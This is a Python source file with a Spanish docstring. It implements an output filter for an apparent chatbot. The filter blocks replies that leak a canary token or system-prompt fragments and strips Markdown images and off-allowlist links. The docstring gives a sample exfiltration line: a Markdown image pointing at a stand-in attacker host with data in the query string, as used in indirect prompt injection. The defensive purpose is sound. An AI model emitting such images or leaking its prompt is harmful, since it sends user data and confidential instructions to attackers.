"""Filtro de salida: última barrera antes de que el texto llegue al usuario.

- LLM07 (fuga del prompt): bloquea la respuesta si contiene el canary token o reproduce
  fragmentos literales de los prompts de sistema (n-gramas de 8 palabras).
- LLM01 indirecto / exfiltración: quita imágenes Markdown (``![](https://atacante/?d=...)``
  filtra datos con solo renderizarse) y enlaces a dominios fuera de la lista blanca.

Por esto la respuesta final no se transmite token a token desde el LLM: el filtro necesita el
texto completo antes de que el usuario vea la primera palabra.
"""

import re
from collections.abc import Iterable
from dataclasses import dataclass
from urllib.parse import urlparse

from agichat.mcp_servers.text import normalize

ALLOWED_LINK_HOSTS = frozenset(
    {
        "themoviedb.org",
        "www.themoviedb.org",
        "imdb.com",
        "www.imdb.com",
        "m.imdb.com",
        "books.google.com",
    }
)
NGRAM = 8
MIN_LEAKED_NGRAMS = 2

_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_MD_LINK = re.compile(r"\[([^\]]*)\]\(([^)\s]*)[^)]*\)")
_BARE_URL = re.compile(r"(?<![(\[])\bhttps?://[^\s)<>\]]+")
_WORD = re.compile(r"\w+")


@dataclass(frozen=True)
class FilterResult:
    text: str
    leaked: bool


def _ngrams(text: str) -> set[tuple[str, ...]]:
    words = _WORD.findall(normalize(text))
    return {tuple(words[i : i + NGRAM]) for i in range(len(words) - NGRAM + 1)}


def _allowed(url: str) -> bool:
    parsed = urlparse(url)
    return parsed.scheme == "https" and (parsed.hostname or "") in ALLOWED_LINK_HOSTS


class OutputFilter:
    def __init__(self, canary: str, secret_texts: Iterable[str], public_texts: Iterable[str]):
        self._canary = canary.casefold()
        public = set().union(*(_ngrams(t) for t in public_texts))
        self._secret_ngrams = set().union(*(_ngrams(t) for t in secret_texts)) - public

    def apply(self, text: str) -> FilterResult:
        compact = re.sub(r"[\s`*_~-]", "", text).casefold()
        if self._canary.replace("-", "") in compact:
            return FilterResult("", leaked=True)
        if len(_ngrams(text) & self._secret_ngrams) >= MIN_LEAKED_NGRAMS:
            return FilterResult("", leaked=True)

        cleaned = _MD_IMAGE.sub("", text)
        cleaned = _MD_LINK.sub(
            lambda m: m.group(0) if _allowed(m.group(2)) else m.group(1), cleaned
        )
        cleaned = _BARE_URL.sub(
            lambda m: m.group(0) if _allowed(m.group(0)) else "[enlace eliminado]", cleaned
        )
        return FilterResult(cleaned.strip(), leaked=False)
